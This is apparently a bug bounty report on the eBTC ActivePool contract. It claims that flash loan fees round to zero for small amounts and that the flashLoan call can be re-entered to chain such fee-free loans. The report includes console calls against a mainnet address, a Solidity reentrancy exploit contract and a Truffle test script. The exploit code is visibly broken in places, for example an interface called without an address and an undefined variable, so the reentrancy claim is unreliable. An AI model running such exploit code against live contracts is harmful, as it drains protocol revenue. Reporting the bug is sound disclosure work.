# 28546 - \[SC - Insight] FlashLoan can be taken with no fee to be paid

Submitted on Feb 20th 2024 at 16:02:57 UTC by @OceanAndThunders for [Boost | eBTC](https://immunefi.com/bounty/ebtc-boost/)

Report ID: #28546

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/ActivePool.sol>

Impacts:

* Protocol insolvency

## Description

## Brief/Intro

The bug does not involve direct theft of funds, but it is a violation of how the the contract is meant to operate, it's exploitation can make the protocol offers flashloans without getting the fees of the loan back from users

## Vulnerability Details

The contract "ActivePool" is meant to offer flash loan for the collateral token for users via the `ActivePool.flashLoan` function, well for the users to have a flashloan they must on the callback sends back the borrowed assets of `address(collateral)` with the calculated fees via `flashFees(address(collateral, amount))` see on "<https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/ActivePool.sol?utm\\_source=immunefi>"

```
#296:         uint256 fee = flashFee(token, amount);
...
#299:         uint256 amountWithFee = amount + fee;
...
#311:         collateral.transferFrom(address(receiver), address(this), amountWithFee);
```

The fee is claculated via the flashFee function, this function calculates the fees based on the given amount as :

```
    function flashFee(address token, uint256 amount) public view override returns (uint256) {
        require(token == address(collateral), "ActivePool: collateral Only");
        require(!flashLoansPaused, "ActivePool: Flash Loans Paused");

        return (amount * feeBps) / MAX_BPS;
    }
```

The problem is that when `amount` + `feeBps` are under MAX\_BPS, (MAX\_BPS > amount + feeBps) where the numerator is less than the denominator it will returns fractions like 0,3 ...etc, fractions will be considered 0 in solidity, thus the fee payment will be 0

as for example if consider calling the actual ActivePool in production (0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590) we will see that the `feeBps` is 3 and `MAX_BPS` is actually 10000, so any number that is under or equal to MAX\_BPS / feeBps (3333) will returns it's fees as 0 !

use the following truffle (combine it with Ganache) Poc

```
truffle console --networkId 5777
```

shows "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590" how it returns 0 as fees for amount of 3333 or under

```

const Web3 = require('web3');
//save 0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590 abi on test/abi.json

const abi = require('./test/abi.json');
const activePool_contract = "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590";





const activePool = new web3.eth.Contract(abi,activePool_contract);

await activePool.methods.flashFee("0xae7ab96520de3a18e5e111b5eaab095312d7fe84",3333).call();
// return 0
await activePool.methods.flashFee("0xae7ab96520de3a18e5e111b5eaab095312d7fe84",3332).call();
// return 0
await activePool.methods.flashFee("0xae7ab96520de3a18e5e111b5eaab095312d7fe84",3334).call();
// return 1
```

means that for any number that is/or under 3333 we pay no fees

That was the first issue

Secondly the function is not protected against reentrancy attacks ! when a malicious actor that re-enters the ActivePool.flashLoan function 10 times on the "onFlashLoan" call with amount as 3333, he will get a flash loan of 33330 with 0 fees ! while the protocol was supposed to get 9 fees on it !

## Impact Details

Combination of both can lead to the protocol being providing a flash loan of any number without getting any fees back, the attacker will consider paying only the high gas fees and not actually paying fees to ActivePool, those fees are the actual profit of the protocol, the existence of the bug means no profit for the protocol !

## Proof of Concept

ActivePool is deployed on mainnet at "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590"

use the following truffle (combine it with Ganache) Poc

```
truffle console --networkId 5777
```

shows "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590" how it returns 0 as fees for amount of 3333 or under

```

const Web3 = require('web3');
//save 0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590 abi on test/abi.json

const abi = require('./test/abi.json');
const activePool_contract = "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590";





const activePool = new web3.eth.Contract(abi,activePool_contract);

await activePool.methods.flashFee("0xae7ab96520de3a18e5e111b5eaab095312d7fe84",3333).call();
// return 0
await activePool.methods.flashFee("0xae7ab96520de3a18e5e111b5eaab095312d7fe84",3332).call();
// return 0
await activePool.methods.flashFee("0xae7ab96520de3a18e5e111b5eaab095312d7fe84",3334).call();
// return 1
```

means that for any number that is/or under 3333 we pay no fees

```

interface IActivePool {

function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external override returns (bool);

}

interface IERC20 {
   function balanceOf(address) external returns(uint256);
}

contract exploit {
   // the desired amount to gain from the accumulated flash loans
    uint256 reachedAmount;
    function setDesiredAmount(uint256 a) external {
      reachedAmount = a;
     }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32 s) {
      
    if(IERC20(token).balanceOf(address(this)) < reachedAmount) {

         // reenter the call to get your amount
IActivePool().flashLoan(address(this),"0x17144556fd3424edc8fc8a4c940b2d04936d17eb",3333,"0x00");
       }
// once gained you do the actions you want to !
   
//gain approval for collateral.transferFrom and returns flashSuccessValue
IERC20(token).approve(msg.sender,type(uint256).max);
 s = 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;

// the loan will be paid 3333 for eah call and each call will give back 0 fees !
   }
}

```

PoC of truffle :

```
var exploit = artifacts.require("exploit");
var ierc20 = artifacts.require("IERC20");
var iactivepool = artifacts.require("IActivePool");
const Web3 = require('web3');



contract('exploit', function(accounts){

  let stuffInstance;
  const activePoolAddress = "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590";
  const activePoolAbi = [{"inputs":[{"internalType":"address","name":"_borrowerOperationsAddress","type":"address"},{"internalType":"address","name":"_cdpManagerAddress","type":"address"},{"internalType":"address","name":"_collTokenAddress","type":"address"},{"internalType":"address","name":"_collSurplusAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_EBTCDebt","type":"uint256"}],"name":"ActivePoolEBTCDebtUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"contract Authority","name":"newAuthority","type":"address"}],"name":"AuthorityUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_to","type":"address"},{"indexed":false,"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"CollSharesTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_newBalance","type":"uint256"}],"name":"EBTCBalanceUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_newBalance","type":"uint256"}],"name":"ETHBalanceUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_coll","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_fee","type":"uint256"}],"name":"FeeRecipientClaimableCollSharesDecreased","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_coll","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_fee","type":"uint256"}],"name":"FeeRecipientClaimableCollSharesIncreased","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_setter","type":"address"},{"indexed":false,"internalType":"uint256","name":"_oldFee","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_newFee","type":"uint256"}],"name":"FlashFeeSet","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_receiver","type":"address"},{"indexed":true,"internalType":"address","name":"_token","type":"address"},{"indexed":false,"internalType":"uint256","name":"_amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_fee","type":"uint256"}],"name":"FlashLoanSuccess","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_setter","type":"address"},{"indexed":false,"internalType":"bool","name":"_paused","type":"bool"}],"name":"FlashLoansPaused","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_setter","type":"address"},{"indexed":false,"internalType":"uint256","name":"_oldMaxFee","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_newMaxFee","type":"uint256"}],"name":"MaxFlashFeeSet","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_oldValue","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_newValue","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_ts","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"_newAcc","type":"uint256"}],"name":"NewTrackValue","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"_token","type":"address"},{"indexed":false,"internalType":"uint256","name":"_amount","type":"uint256"},{"indexed":true,"internalType":"address","name":"_recipient","type":"address"}],"name":"SweepTokenSuccess","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"_coll","type":"uint256"}],"name":"SystemCollSharesUpdated","type":"event"},{"anonymous":false,"inputs":[],"name":"TwapDisabled","type":"event"},{"inputs":[],"name":"DECIMAL_PRECISION","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"FLASH_SUCCESS_VALUE","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_BPS","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_FEE_BPS","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"NAME","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PERIOD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_shares","type":"uint256"}],"name":"allocateSystemCollSharesToFeeRecipient","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"authority","outputs":[{"internalType":"contract Authority","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"authorityInitialized","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"borrowerOperationsAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"cdpManagerAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_shares","type":"uint256"}],"name":"claimFeeRecipientCollShares","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"collSurplusPoolAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"collateral","outputs":[{"internalType":"contract ICollateralToken","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"data","outputs":[{"internalType":"uint128","name":"observerCumuVal","type":"uint128"},{"internalType":"uint128","name":"accumulator","type":"uint128"},{"internalType":"uint64","name":"lastObserved","type":"uint64"},{"internalType":"uint64","name":"lastAccrued","type":"uint64"},{"internalType":"uint128","name":"lastObservedAverage","type":"uint128"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"decreaseSystemDebt","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"feeBps","outputs":[{"internalType":"uint16","name":"","type":"uint16"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"feeRecipientAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"flashFee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"contract IERC3156FlashBorrower","name":"receiver","type":"address"},{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"flashLoan","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"flashLoansPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getData","outputs":[{"components":[{"internalType":"uint128","name":"observerCumuVal","type":"uint128"},{"internalType":"uint128","name":"accumulator","type":"uint128"},{"internalType":"uint64","name":"lastObserved","type":"uint64"},{"internalType":"uint64","name":"lastAccrued","type":"uint64"},{"internalType":"uint128","name":"lastObservedAverage","type":"uint128"}],"internalType":"struct IBaseTwapWeightedObserver.PackedData","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getFeeRecipientClaimableCollShares","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getLatestAccumulator","outputs":[{"internalType":"uint128","name":"","type":"uint128"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getSystemCollShares","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getSystemDebt","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"increaseSystemCollShares","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"increaseSystemDebt","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"locked","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"maxFlashLoan","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"observe","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_newFee","type":"uint256"}],"name":"setFeeBps","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bool","name":"_paused","type":"bool"}],"name":"setFlashLoansPaused","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint128","name":"value","type":"uint128"}],"name":"setValueAndUpdate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"sweepToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"timeToAccrue","outputs":[{"internalType":"uint64","name":"","type":"uint64"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"},{"internalType":"uint256","name":"_shares","type":"uint256"}],"name":"transferSystemCollShares","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_account","type":"address"},{"internalType":"uint256","name":"_shares","type":"uint256"},{"internalType":"uint256","name":"_liquidatorRewardShares","type":"uint256"}],"name":"transferSystemCollSharesAndLiquidatorReward","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"twapDisabled","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"update","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"valueToTrack","outputs":[{"internalType":"uint128","name":"","type":"uint128"}],"stateMutability":"view","type":"function"}]


 before(async () => {
    stuffInstance = await exploit.deployed();
  });



it("setUp and exploit", async () =>  {
       var _usdc = "0x17144556fd3424edc8fc8a4c940b2d04936d17eb";
       // set asset to stETH
       const stETH = await ierc20.at(_usdc);
      console.log("asset set to :" + s);

       const activePool = new web3.eth.Contract(activePoolAbi,activePoolAddress);       


      await exploit.setDesiredAmount(9999);
   

     const af = await activePool.methods.flashLoan(exploit.address,"0x17144556fd3424edc8fc8a4c940b2d04936d17eb",3333,"0x00");
    });

 });
```

The call re-enters 3 times (as pr desired amount is 3333 \* 3 to reach) the flashloan will be taken and pays back 0 as fees

Regards,

Adam
